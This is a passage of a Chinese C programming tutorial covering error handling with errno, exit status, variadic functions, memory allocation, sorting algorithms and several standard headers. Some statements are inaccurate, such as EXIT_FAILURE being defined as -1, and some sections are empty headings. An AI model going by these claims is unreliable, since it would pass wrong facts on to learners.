<li><strong>perror()</strong> 函数显示您传给它的字符串，后跟一个冒号、一个空格和当前 errno 值的文本表示形式。</li>
<li><strong>strerror()</strong> 函数，返回一个指针，指针指向当前 errno 值的文本表示形式。</li>
</ul>
<p>让我们来模拟一种错误情况，尝试打开一个不存在的文件。您可以使用多种方式来输出错误消息，在这里我们使用函数来演示用法。另外有一点需要注意，您应该使用 <strong>stderr</strong> 文件流来输出所有的错误。</p>
<p>实例:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> errno;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	FILE *pf;</span><br><span class="line">  <span class="type">int</span> errnum;</span><br><span class="line">  pf = fopen(<span class="string">&quot;unexist.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (pf == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		errnum = errno;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;错误号:%d\n&quot;</span>,errno);</span><br><span class="line">    perror(<span class="string">&quot;通过perror输出错误&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;打开文件错误:%s\n&quot;</span>,strerror(errnum));</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    fclose(pf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">错误号: <span class="number">2</span></span><br><span class="line">通过 perror 输出错误: No such file or directory</span><br><span class="line">打开文件错误: No such file or directory</span><br></pre></td></tr></table></figure>

<h2 id="被零除的错误"><a href="#被零除的错误" class="headerlink" title="被零除的错误"></a>被零除的错误</h2><p>在进行除法运算时，如果不检查除数是否为零，则会导致一个运行时错误。</p>
<p>为了避免这种情况发生，下面的代码在进行除法运算前会先检查除数是否为零：</p>
<p>实例:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span>  </span></span><br><span class="line">main() &#123;   </span><br><span class="line">  <span class="type">int</span> dividend = <span class="number">20</span>;   </span><br><span class="line">  <span class="type">int</span> divisor = <span class="number">0</span>;   </span><br><span class="line">  <span class="type">int</span> quotient;    </span><br><span class="line">  <span class="keyword">if</span>( divisor == <span class="number">0</span>)&#123;      </span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;除数为 0 退出运行...\n&quot;</span>);      		 </span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);   </span><br><span class="line">  &#125;   </span><br><span class="line">  quotient = dividend / divisor;       </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;quotient 变量的值为 : %d\n&quot;</span>,quotient );    </span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>当上面的代码被编译和执行时，它会产生下列结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">除数为 0 退出运行...</span><br></pre></td></tr></table></figure>

<h2 id="程序退出状态"><a href="#程序退出状态" class="headerlink" title="程序退出状态"></a>程序退出状态</h2><p>通常情况下，程序成功执行完一个操作正常退出的时候会带有值 EXIT_SUCCESS。在这里，EXIT_SUCCESS 是宏，它被定义为 0。</p>
<p>如果程序中存在一种错误情况，当您退出程序时，会带有状态值 EXIT_FAILURE，被定义为 -1。所以，上面的程序可以写成：</p>
<p>实例:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span>  </span></span><br><span class="line">main() &#123;   </span><br><span class="line">  <span class="type">int</span> dividend = <span class="number">20</span>;   </span><br><span class="line">  <span class="type">int</span> divisor = <span class="number">5</span>;   </span><br><span class="line">  <span class="type">int</span> quotient;    </span><br><span class="line">  <span class="keyword">if</span>( divisor == <span class="number">0</span>)&#123;      </span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;除数为 0 退出运行...\n&quot;</span>);      </span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);   </span><br><span class="line">  &#125;   </span><br><span class="line">  quotient = dividend / divisor;   </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;quotient 变量的值为: %d\n&quot;</span>, quotient );    </span><br><span class="line">  <span class="built_in">exit</span>(EXIT_SUCCESS); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当上面的代码被编译和执行时，它会产生下列结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">quotient 变量的值为 : 4</span><br></pre></td></tr></table></figure>

<h2 id="C语言-exit（0）与exit（1）、return区别"><a href="#C语言-exit（0）与exit（1）、return区别" class="headerlink" title="C语言 exit（0）与exit（1）、return区别"></a>C语言 exit（0）与exit（1）、return区别</h2><p>exit（0）：正常运行程序并退出程序；</p>
<p>exit（1）：非正常运行导致退出程序；</p>
<p>return（）：返回函数，若在主函数中，则会退出函数并返回一值。</p>
<p>详细说：</p>
<ol>
<li><p>return返回函数值，是关键字； exit 是一个函数。</p>
</li>
<li><p>return是语言级别的，它表示了调用堆栈的返回；而exit是系统调用级别的，它表示了一个进程的结束。</p>
</li>
<li><p>return是函数的退出(返回)；exit是进程的退出。 </p>
</li>
<li><p>return是C语言提供的，exit是操作系统提供的（或者函数库中给出的）。</p>
</li>
<li><p>return用于结束一个函数的执行，将函数的执行信息传出个其他调用函数使用；exit函数是退出应用程序，删除进程使用的内存空间，并将应用程序的一个状态返回给OS(操作系统)，这个状态标识了应用程序的一些运行信息，这个信息和机器和操作系统有关，一般是 0 为正常退出，非0 为非正常退出。</p>
</li>
<li><p>非主函数中调用return和exit效果很明显，但是在main函数中调用return和exit的现象就很模糊，多数情况下现象都是一致的。</p>
</li>
</ol>
<h1 id="C可变参数"><a href="#C可变参数" class="headerlink" title="C可变参数"></a>C可变参数</h1><p>实例:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span>, ... )</span>  <span class="comment">//int 表示可传入几个参数</span></span><br><span class="line">&#123;</span><br><span class="line">   .</span><br><span class="line">   .</span><br><span class="line">   .</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   func(<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">   func(<span class="number">3</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>请注意，函数 <strong>func()</strong> 最后一个参数写成省略号，即三个点号（**…**），省略号之前的那个参数是 <strong>int</strong>，代表了要传递的可变参数的总数。为了使用这个功能，您需要使用 <strong>stdarg.h</strong> 头文件，该文件提供了实现可变参数功能的函数和宏。具体步骤如下：</p>
<ul>
<li>定义一个函数，最后一个参数为省略号，省略号前面可以设置自定义参数。</li>
<li>在函数定义中创建一个 <strong>va_list</strong> 类型变量，该类型是在 stdarg.h 头文件中定义的。</li>
<li>使用 <strong>int</strong> 参数和 <strong>va_start</strong> 宏来初始化 <strong>va_list</strong> 变量为一个参数列表。宏 va_start 是在 stdarg.h 头文件中定义的。</li>
<li>使用 <strong>va_arg</strong> 宏和 <strong>va_list</strong> 变量来访问参数列表中的每个项。</li>
<li>使用宏 <strong>va_end</strong> 来清理赋予 <strong>va_list</strong> 变量的内存。</li>
</ul>
<p>现在让我们按照上面的步骤，来编写一个带有可变数量参数的函数，并返回它们的平均值：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">double</span> <span class="title function_">average</span><span class="params">(<span class="type">int</span> num,...)</span></span><br><span class="line">&#123;</span><br><span class="line"> </span><br><span class="line">    va_list valist;</span><br><span class="line">    <span class="type">double</span> sum = <span class="number">0.0</span>;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* 为 num 个参数初始化 valist */</span></span><br><span class="line">    va_start(valist, num);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* 访问所有赋给 valist 的参数 */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">    &#123;</span><br><span class="line">       sum += va_arg(valist, <span class="type">int</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 清理为 valist 保留的内存 */</span></span><br><span class="line">    va_end(valist);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> sum/num;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Average of 2, 3, 4, 5 = %f\n&quot;</span>, average(<span class="number">4</span>, <span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>));</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Average of 5, 10, 15 = %f\n&quot;</span>, average(<span class="number">3</span>, <span class="number">5</span>,<span class="number">10</span>,<span class="number">15</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="C内存管理"><a href="#C内存管理" class="headerlink" title="C内存管理"></a>C内存管理</h1><p>本章将讲解 C 中的动态内存管理。C 语言为内存的分配和管理提供了几个函数。这些函数可以在 <strong>&lt;stdlib.h&gt;</strong> 头文件中找到。</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">函数和描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><strong>void *calloc(int num, int size);</strong> 在内存中动态地分配 num 个长度为 size 的连续空间，并将每一个字节都初始化为 0。所以它的结果是分配了 num*size 个字节长度的内存空间，并且每个字节的值都是0。</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left"><strong>void free(void *address);</strong>  该函数释放 address 所指向的内存块,释放的是动态分配的内存空间。</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left"><strong>void *malloc(int num);</strong>  在堆区分配一块指定大小的内存空间，用来存放数据。这块内存空间在函数执行完成后不会被初始化，它们的值是未知的。</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left"><strong>void *realloc(void *address, int newsize);</strong>  该函数重新分配内存，把内存扩展到 <strong>newsize</strong>。</td>
</tr>
</tbody></table>
<p><strong>注意：</strong>void * 类型表示未确定类型的指针。C、C++ 规定 void * 类型可以通过类型转换强制转换为任何其它类型的指针。</p>
<h1 id="C命令行参数"><a href="#C命令行参数" class="headerlink" title="C命令行参数"></a>C命令行参数</h1><h1 id="C排序算法"><a href="#C排序算法" class="headerlink" title="C排序算法"></a>C排序算法</h1><h2 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bubbleSort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i, j, temp;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; len - <span class="number">1</span> - i; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) &#123;</span><br><span class="line">                temp = arr[j];</span><br><span class="line">                arr[j] = arr[j + <span class="number">1</span>];</span><br><span class="line">                arr[j + <span class="number">1</span>] = temp;</span><br><span class="line">                flag = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (flag == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> arr[] = &#123; <span class="number">22</span>, <span class="number">34</span>, <span class="number">3</span>, <span class="number">32</span>, <span class="number">82</span>, <span class="number">55</span>, <span class="number">89</span>, <span class="number">50</span>, <span class="number">37</span>, <span class="number">5</span>, <span class="number">64</span>, <span class="number">35</span>, <span class="number">9</span>, <span class="number">70</span> &#125;;</span><br><span class="line">    <span class="type">int</span> arr1[] = &#123;<span class="number">2</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">6</span>&#125;;</span><br><span class="line">    <span class="type">int</span> len = (<span class="type">int</span>) <span class="keyword">sizeof</span>(arr1) / <span class="keyword">sizeof</span>(*arr1);</span><br><span class="line">    bubbleSort(arr1, len);</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr1[i]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span> *a, <span class="type">int</span> *b)</span> &#123;</span><br><span class="line">  <span class="type">int</span> temp = *a;</span><br><span class="line">  *a = *b;</span><br><span class="line">  *b = temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">selectionSort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> len)</span> &#123;</span><br><span class="line">  <span class="type">int</span> i, j;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++) &#123;</span><br><span class="line">    <span class="type">int</span> min = i;</span><br><span class="line">    <span class="keyword">for</span> (j = i + <span class="number">1</span>; j &lt; len; j++) &#123;</span><br><span class="line">    		<span class="keyword">if</span> (arr[j] &lt; arr[min]) &#123;</span><br><span class="line">            min = j;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    swap(&amp;arr[min],&amp;arr[i]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">insertionSort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> len)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j,temp;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;len;i++)&#123;</span><br><span class="line">            temp = arr[i];</span><br><span class="line">            <span class="keyword">for</span> (j=i;j&gt;<span class="number">0</span> &amp;&amp; arr[j<span class="number">-1</span>]&gt;temp;j--)</span><br><span class="line">                    arr[j] = arr[j<span class="number">-1</span>];</span><br><span class="line">            arr[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h2><h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2><h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><h1 id="C标准库-lt-assert-h-gt"><a href="#C标准库-lt-assert-h-gt" class="headerlink" title="C标准库-&lt;assert.h&gt;"></a>C标准库-&lt;assert.h&gt;</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>C 标准库的 <strong>assert.h</strong>头文件提供了一个名为 <strong>assert</strong> 的宏，它可用于验证程序做出的假设，并在假设为假时输出诊断消息。</p>
<p>已定义的宏 <strong>assert</strong> 指向另一个宏 <strong>NDEBUG</strong>，宏 <strong>NDEBUG</strong> 不是 &lt;assert.h&gt; 的一部分。如果已在引用 &lt;assert.h&gt; 的源文件中定义 NDEBUG 为宏名称，则 <strong>assert</strong> 宏的定义如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define assert(ignore) ((void)0)</span><br></pre></td></tr></table></figure>

<h2 id="库宏"><a href="#库宏" class="headerlink" title="库宏"></a>库宏</h2><p>下面列出了头文件 assert.h 中定义的唯一的函数：</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">函数 &amp; 描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-macro-assert.html">void assert(int expression)</a> 这实际上是一个宏，不是一个函数，可用于在 C 程序中添加诊断。</td>
</tr>
</tbody></table>
<h1 id="C-标准库-lt-ctype-h-gt"><a href="#C-标准库-lt-ctype-h-gt" class="headerlink" title="C 标准库 - &lt;ctype.h&gt;"></a>C 标准库 - &lt;ctype.h&gt;</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><p>C 标准库的 <strong>ctype.h</strong> 头文件提供了一些函数，可用于测试和映射字符。</p>
<p>这些函数接受 <strong>int</strong> 作为参数，它的值必须是 EOF 或表示为一个无符号字符。</p>
<p>如果参数 c 满足描述的条件，则这些函数返回非零（true）。如果参数 c 不满足描述的条件，则这些函数返回零。</p>
<h2 id="库函数"><a href="#库函数" class="headerlink" title="库函数"></a>库函数</h2><p>下面列出了头文件 ctype.h 中定义的函数：</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">函数 &amp; 描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-isalnum.html">int isalnum(int c)</a> 该函数检查所传的字符是否是字母和数字。</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-isalpha.html">int isalpha(int c)</a> 该函数检查所传的字符是否是字母。</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-iscntrl.html">int iscntrl(int c)</a> 该函数检查所传的字符是否是控制字符。</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-isdigit.html">int isdigit(int c)</a> 该函数检查所传的字符是否是十进制数字。</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-isgraph.html">int isgraph(int c)</a> 该函数检查所传的字符是否有图形表示法。</td>
</tr>
<tr>
<td align="left">6</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-islower.html">int islower(int c)</a> 该函数检查所传的字符是否是小写字母。</td>
</tr>
<tr>
<td align="left">7</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-isprint.html">int isprint(int c)</a> 该函数检查所传的字符是否是可打印的。</td>
</tr>
<tr>
<td align="left">8</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-ispunct.html">int ispunct(int c)</a> 该函数检查所传的字符是否是标点符号字符。</td>
</tr>
<tr>
<td align="left">9</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-isspace.html">int isspace(int c)</a> 该函数检查所传的字符是否是空白字符。</td>
</tr>
<tr>
<td align="left">10</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-isupper.html">int isupper(int c)</a> 该函数检查所传的字符是否是大写字母。</td>
</tr>
<tr>
<td align="left">11</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-isxdigit.html">int isxdigit(int c)</a> 该函数检查所传的字符是否是十六进制数字。</td>
</tr>
</tbody></table>
<p>标准库还包含了两个转换函数，它们接受并返回一个 “int”</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">函数 &amp; 描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-tolower.html">int tolower(int c)</a> 该函数把大写字母转换为小写字母。</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-toupper.html">int toupper(int c)</a> 该函数把小写字母转换为大写字母。</td>
</tr>
</tbody></table>
<h2 id="字符类"><a href="#字符类" class="headerlink" title="字符类"></a>字符类</h2><table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">字符类 &amp; 描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><strong>数字</strong> 完整的数字集合 { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 }</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left"><strong>十六进制数字</strong> 集合 { 0 1 2 3 4 5 6 7 8 9 A B C D E F a b c d e f }</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left"><strong>小写字母</strong> 集合 { a b c d e f g h i j k l m n o p q r s t u v w x y z }</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left"><strong>大写字母</strong> 集合 {A B C D E F G H I J K L M N O P Q R S T U V W X Y Z }</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left"><strong>字母</strong> 小写字母和大写字母的集合</td>
</tr>
<tr>
<td align="left">6</td>
<td align="left"><strong>字母数字字符</strong> 数字、小写字母和大写字母的集合</td>
</tr>
<tr>
<td align="left">7</td>
<td align="left"><strong>标点符号字符</strong> 集合 ! “ # $ % &amp; ‘ ( ) * + , - . &#x2F; : ; &lt; &#x3D; &gt; ? @ [ \ ] ^ _ &#96; { | } ~</td>
</tr>
<tr>
<td align="left">8</td>
<td align="left"><strong>图形字符</strong> 字母数字字符和标点符号字符的集合</td>
</tr>
<tr>
<td align="left">9</td>
<td align="left"><strong>空格字符</strong> 制表符、换行符、垂直制表符、换页符、回车符、空格符的集合。</td>
</tr>
<tr>
<td align="left">10</td>
<td align="left"><strong>可打印字符</strong> 字母数字字符、标点符号字符和空格字符的集合。</td>
</tr>
<tr>
<td align="left">11</td>
<td align="left"><strong>控制字符</strong> 在 ASCII 编码中，这些字符的八进制代码是从 000 到 037，以及 177（DEL）。</td>
</tr>
<tr>
<td align="left">12</td>
<td align="left"><strong>空白字符</strong> 包括空格符和制表符。</td>
</tr>
<tr>
<td align="left">13</td>
<td align="left"><strong>字母字符</strong> 小写字母和大写字母的集合。</td>
</tr>
</tbody></table>
<h1 id="C-标准库-lt-errno-h-gt"><a href="#C-标准库-lt-errno-h-gt" class="headerlink" title="C 标准库 - &lt;errno.h&gt;"></a>C 标准库 - &lt;errno.h&gt;</h1><h2 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h2><p>C 标准库的 <strong>errno.h</strong> 头文件定义了整数变量 <strong>errno</strong>，它是通过系统调用设置的，在错误事件中的某些库函数表明了什么发生了错误。该宏扩展为类型为 int 的可更改的左值，因此它可以被一个程序读取和修改。</p>
<p>在程序启动时，<strong>errno</strong> 设置为零，C 标准库中的特定函数修改它的值为一些非零值以表示某些类型的错误。您也可以在适当的时候修改它的值或重置为零。</p>
<p><strong>errno.h</strong> 头文件定义了一系列表示不同错误代码的宏，这些宏应扩展为类型为 <strong>int</strong> 的整数常量表达式。</p>
<h2 id="库宏-1"><a href="#库宏-1" class="headerlink" title="库宏"></a>库宏</h2><p>下面列出了头文件 errno.h 中定义的宏：</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">宏 &amp; 描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-macro-errno.html">extern int errno</a> 这是通过系统调用设置的宏，在错误事件中的某些库函数表明了什么发生了错误。</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-macro-edom.html">EDOM Domain Error</a> 这个宏表示一个域错误，它在输入参数超出数学函数定义的域时发生，errno 被设置为 EDOM。</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-macro-erange.html">ERANGE Range Error</a> 这个宏表示一个范围错误，它在输入参数超出数学函数定义的范围时发生，errno 被设置为 ERANGE。</td>
</tr>
</tbody></table>
<h1 id="C-进程管理"><a href="#C-进程管理" class="headerlink" title="C 进程管理"></a>C 进程管理</h1><p>一个进程，包括代码、数据和分配给进程的资源。fork（）函数通过系统调用创建一个与原来进程几乎完全相同的进程，也就是两个进程可以做完全相同的事，但如果初始参数或者传入的变量不同，两个进程也可以做不同的事。<br>  一个进程调用fork（）函数后，系统先给新的进程分配资源，例如存储数据和代码的空间。然后把原来的进程的所有值都复制到新的新进程中，只有少数值与原来的进程的值不同。相当于克隆了一个自己。</p>
<p> 1）在父进程中，fork返回新创建子进程的进程ID；<br>  2）在子进程中，fork返回0；<br>  3）如果出现错误，fork返回一个负值；</p>
<h1 id="C-标准库-lt-float-h-gt"><a href="#C-标准库-lt-float-h-gt" class="headerlink" title="C 标准库 - &lt;float.h&gt;"></a>C 标准库 - &lt;float.h&gt;</h1><h2 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h2><p>C 标准库的 <strong>float.h</strong> 头文件包含了一组与浮点值相关的依赖于平台的常量。这些常量是由 ANSI C 提出的，这让程序更具有可移植性。在讲解这些常量之前，最好先弄清楚浮点数是由下面四个元素组成的：</p>
<table>
<thead>
<tr>
<th align="left">组件</th>
<th align="left">组件描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">S</td>
<td align="left">符号 ( +&#x2F;- )</td>
</tr>
<tr>
<td align="left">b</td>
<td align="left">指数表示的基数，2 表示二进制，10 表示十进制，16 表示十六进制，等等…</td>
</tr>
<tr>
<td align="left">e</td>
<td align="left">指数，一个介于最小值 <strong>emin</strong> 和最大值 <strong>emax</strong> 之间的整数。</td>
</tr>
<tr>
<td align="left">p</td>
<td align="left">精度，基数 b 的有效位数</td>
</tr>
</tbody></table>
<p>基于以上 4 个组成部分，一个浮点数的值如下：</p>
<p>$floating-point &#x3D; ( S ) p * b^e$</p>
<p>或</p>
<p>$floating-point &#x3D; (+&#x2F;-) precision * base^{exponent}$</p>
<h2 id="库宏-2"><a href="#库宏-2" class="headerlink" title="库宏"></a>库宏</h2><p>下面的值是特定实现的，且是通过 #define 指令来定义的，这些值都不得低于下边所给出的值。请注意，所有的实例 FLT 是指类型 float，DBL 是指类型 double，LDBL 是指类型 long double。</p>
<table>
<thead>
<tr>
<th align="left">宏</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">FLT_ROUNDS</td>
<td align="left">定义浮点加法的舍入模式，它可以是下列任何一个值：-1 - 无法确定0 - 趋向于零1 - 去最近的值2 - 趋向于正无穷3 - 趋向于负无穷</td>
</tr>
<tr>
<td align="left">FLT_RADIX 2</td>
<td align="left">这个宏定义了指数表示的基数。基数 2 表示二进制，基数 10 表示十进制，基数 16 表示十六进制。</td>
</tr>
<tr>
<td align="left">FLT_MANT_DIGDBL_MANT_DIGLDBL_MANT_DIG</td>
<td align="left">这些宏定义了 FLT_RADIX 基数中的位数。</td>
</tr>
<tr>
<td align="left">FLT_DIG 6DBL_DIG 10LDBL_DIG 10</td>
<td align="left">这些宏定义了舍入后不会改变表示的十进制数字的最大值（基数 10）。</td>
</tr>
<tr>
<td align="left">FLT_MIN_EXPDBL_MIN_EXPLDBL_MIN_EXP</td>
<td align="left">这些宏定义了基数为 FLT_RADIX 时的指数的最小负整数值。</td>
</tr>
<tr>
<td align="left">FLT_MIN_10_EXP -37DBL_MIN_10_EXP -37LDBL_MIN_10_EXP -37</td>
<td align="left">这些宏定义了基数为 10 时的指数的最小负整数值。</td>
</tr>
<tr>
<td align="left">FLT_MAX_EXPDBL_MAX_EXPLDBL_MAX_EXP</td>
<td align="left">这些宏定义了基数为 FLT_RADIX 时的指数的最大整数值。</td>
</tr>
<tr>
<td align="left">FLT_MAX_10_EXP +37DBL_MAX_10_EXP +37LDBL_MAX_10_EXP +37</td>
